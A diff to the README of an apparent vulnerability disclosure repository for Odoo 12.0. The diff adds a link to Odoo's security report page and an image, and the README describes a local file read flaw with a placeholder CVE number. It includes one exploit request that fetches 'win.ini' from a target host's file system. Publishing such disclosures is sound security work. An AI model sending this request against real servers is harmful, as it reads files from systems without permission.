@@ -1,6 +1,10 @@
 # Odoo-12.0-LFI-Vulnerabilities
 [Odoo 12.0](https://www.odoo.com/) that is open source ERP and CRM, allows remote attackers to read local files. 
 
+[https://www.odoo.com/security-report](https://www.odoo.com/security-report)
+
+![alt tag](https://emreovunc.com/images/odoo-emreovunc-security.png)
+
 # CVE-2019-XXXXX
 To exploit vulnerability, someone could use 'http://[HOST]:8069/base_import/static/c:/windows/win.ini' request to get some informations from the target.
 
